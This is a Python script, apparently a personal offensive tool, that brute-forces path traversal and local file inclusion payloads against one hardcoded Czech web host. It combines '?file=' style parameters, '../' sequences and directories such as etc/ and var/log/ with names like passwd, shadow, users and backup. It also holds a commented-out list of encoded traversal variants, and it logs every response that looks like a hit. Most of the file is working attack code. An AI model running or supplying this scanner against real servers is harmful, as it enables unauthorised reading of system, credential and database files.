import re
import argparse
import sys
import requests
from http.cookies import SimpleCookie
import time

"http://apache1.willilazarov.cz/?file=../backup/users.sql"
# Long webpage content
dont = "http://apache1.willilazarov.cz/?file=index.php"
a = 0

stuff = [
    "",
    "backup/",
    "database/",
    "db/",
    "backup-db/",
    "etc/",
    "var/",
    "var/log/",
    "var/www/files/",
]
tecicky = [
    "",
    "../",
    "../../",
    "../../../",
     "../../../../",
]
files = [
    "",
    "?file=",
    "get-files",
    "get-files?",
    "file:",
    "index.php?p=",
    "get-files?file=",

]
"""
dot_dot = [
    "",
    "etc",
    "/..",
    "....//",
    "//....",
    "%252e%252e%255c",
    "%2e%2e%5c",
    "..%255c",
    "..%5c",
    "%5c../",
    "/%5c..",
    "..\\",
    "%2e%2e%2f",
    "../",
    "../../",
    "../../../",
    "...\\",
    "..../",
    "....\\",
]
"""
words = [
    "",
    "functions",
    "backup",
    "users",
    "connect",
    "shadow",
    "security",
    "comment",
    "passwd",
    "group",
    "user",
    "index",
    "login",
    "home",
    "dashboard",
    "delete",
    "update",
    "remove",
    "access",
    "apache",
    "apache2",
    "httpd",
    "logs",
]
suffix = [
    "",
    ".py",
    ".php",
    ".html",
    ".js",
    ".txt",
    ".sql",
    ".log",

]

def count_searched():
    global a
    a += 1
    if a % 200 == 0:
        print("searching...  " + str(a) + " searched")

# Compare warning messages to content
def false_positives(end, content):
    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
    if warning1 in content or warning2 in content:
        print("warning")
        return True
    else:
        print("No warning")
        return False

# Compare content with normal website content
def not_normal(content, normal_content):
    if content != normal_content:
        print("normal")
        return True
    else:
        print("not normal")
        return False



def try_path(url, path, end):
    full_content = ""
    shortened_content = ""
    headers = ""
    full_url = url + path
    try:
        request = requests.get(full_url)
        normal_content = normal_con(url)
        status = request.status_code
        if status != 400 and status != 404 and status != 403 and status != 500:
            # False positive tests
            # Isn't normal website content
            if not_normal(request.text, normal_content):
                # Isn't error message
                if false_positives(end, request.text) == False:
                    # isn't already found path (to be written).......................
                    if "already_found" == "already_found":
                        # all tests passed
                        print("\n" + full_url)
                        print("[+] Status Code: " + str(status))
                        for item, value in request.headers.items():
                            headers += "\n" + item + value
                        print("[+] Headers:" + headers)
                        # dont want that in a log
                        if full_url != dont:
                            # trim the boring repetitive stuff
                            if normal_content in request.text:
                                full_content = request.text
                                shortened_content = full_content.replace(normal_content, "\n Normal website content")
                                print("\n[+] Start of body (shortened): \n" + shortened_content + "\n[+] End of body")
                            else:
                                print("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                        else:
                            print("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                        try:
                            f = open("log_file.txt", "a")
                            f.write("\n----------------------------------------------------------------------------------------------")
                            f.write("\n" + full_url)
                            f.write("\n----------------------------------------------------------------------------------------------")
                            f.write("\n[+] Status Code: " + str(status))
                            f.write("\n[+] Headers:" + headers)
                            # dont want that in a log
                            if full_url != dont:
                                if shortened_content != "":
                                    f.write("\n[+] Start of body (shortened): \n" + shortened_content + "\n[+] End of body")
                                else:
                                    f.write("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                            else:
                                f.write("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                            f.close()
                        except:
                            print("\n" + full_url)
                            print("Problem with file")
    except:
        print("\n" + full_url)
        print("URL problem")




def try_all(url):
    for file in files:
        for dot in tecicky:
            for stu in stuff:
                for word in words:
                    for suf in suffix:
                        count_searched()
                        cur_path = file + dot + stu + word + suf
                        cur_end = dot + stu + word + suf
                        try_path(url, cur_path, cur_end)
                        """
                        warning = ""
                        zkracene = ""
                        dlouhe = ""
                        fpositive = False
                        headers = ""
                        payload = file + dot + stu + word + suf
                        end = dot + stu + word + suf

                        try:
                            full_url = url + payload
                            request = requests.get(full_url)
                            if request.status_code != 400 and request.status_code != 404 and request.status_code != 403:
                                # False positive tests
                                # Isn't normal website content
                                if request.text != normal_con(url):
                                    # isn't error message (to be written)
                                    warning1 = "Warning: include(" + end + "): failed to open stream: No such file or directory in"
                                    warning2 = "Warning: include(): Failed opening \'" + end + "\' for inclusion"
                                    if warning1 in request.text or warning2 in request.text:
                                        fpositive = True
                                    # isn't already found path (to be written).......................
                                    if fpositive == False:
                                        print("\n"+ full_url)
                                        print("[+] Status Code: " + str(request.status_code))
                                        for item, value in request.headers.items():
                                            #print(item, value)
                                            headers += "\n" + item + value
                                        print("[+] Headers:" + headers)
                                        # dont want that in a log
                                        if full_url != dont:
                                            # trims the boring stuff
                                            if normal_con(url) in request.text:
                                                dlouhe = request.text
                                                zkracene = dlouhe.replace(normal_con(url), 'Normal website content')
                                                print("Zkracene")
                                                print("\n[+] Start of body (shortened): \n" + zkracene + "\n[+] End of body")
                                            else:
                                                print("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                                        else:
                                            print("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                                        try:
                                            f = open("druhy.txt", "a")
                                            f.write("\n---------------------------------------------------------------------------------------------------")
                                            f.write("\n" + full_url)
                                            f.write("\n---------------------------------------------------------------------------------------------------")
                                            f.write("\n[+] Status Code: " + str(request.status_code))
                                            f.write("\n[+] Headers:" + headers)
                                            # dont want that in a log
                                            if full_url != dont:
                                                if zkracene != "":
                                                    f.write("\n[+] Start of body (shortened): \n" + zkracene + "\n[+] End of body")
                                                else:
                                                    f.write("\n[+] Start of body: \n" + request.text + "\n[+] End of body")
                                            else:
                                                f.write("\n[+] Start of body: \n Lots of useless things" + "\n[+] End of body")
                                            f.close()
                                        except:
                                            print("Problem with file")
                        except:
                            print("URL problem")
                        """


def normal_con(url):
    content = requests.get(url)
    return content.text



if __name__ == '__main__':
    f = open("log_file.txt", "w")
    url = 'http://apache1.willilazarov.cz/'
    try_all(url)
